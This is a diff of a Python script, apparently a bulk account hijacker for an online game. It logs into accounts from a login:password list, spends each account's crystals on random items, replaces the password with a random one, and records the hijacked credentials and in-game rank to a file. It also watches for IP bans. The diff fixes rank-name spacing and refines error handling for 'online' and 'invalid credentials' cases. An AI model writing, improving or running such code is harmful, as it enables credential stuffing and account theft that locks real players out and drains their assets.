@@ -41,9 +41,9 @@ rangs = {
     13: "Уорэнт-офицер 3",
     14: "Уорэнт-офицер 4",
     15: "Уорэнт-офицер 5",
-    16: "Младшийлейтенант",
+    16: "Младший лейтенант",
     17: "Лейтенант",
-    18: "Старшийлейтенант",
+    18: "Старший лейтенант",
     19: "Капитан",
     20: "Майор",
     21: "Подполковник",
@@ -111,18 +111,20 @@ if __name__ == '__main__':
                 logging.critical("IP BANNED!")
                 break
             current_user = client.auth(login, password)
-            if not current_user:
-                raise Exception(f"Account {login} is online or invalid credentials")
-            crystalls = current_user['crystall']
-            current_rang_id = current_user['rang']
-            current_rang = rangs[current_rang_id]
-            buy_rnd_items(client, crystalls)
-            password = change_rnd_password(client)
-            utils.write_file(processed_path, f"{login}:{password}|{current_rang}\n", True)
-            logging.info(f"Processed account {login} with the rang of {current_rang}")  
+            if current_user is None:
+                raise Exception(f"{login} is online!")
+            elif not current_user:
+                logging.error(f"Invalid credentials {account}")
+            else:
+                crystalls = current_user['crystall']
+                current_rang_id = current_user['rang']
+                current_rang = rangs[current_rang_id]
+                buy_rnd_items(client, crystalls)
+                password = change_rnd_password(client)
+                utils.write_file(processed_path, f"{login}:{password}|{current_rang}\n", True)
+                logging.info(f"Processed account {login} with the rang of {current_rang}")  
         except Exception as e:
-            if hasattr(e, 'message'):
-                logging.error(e.message)
+            logging.error(e)
             utils.write_file(errors_path, f"{login}:{password}\n", True)
             logging.error(f"Error with account {account}")
         remain.remove(account)
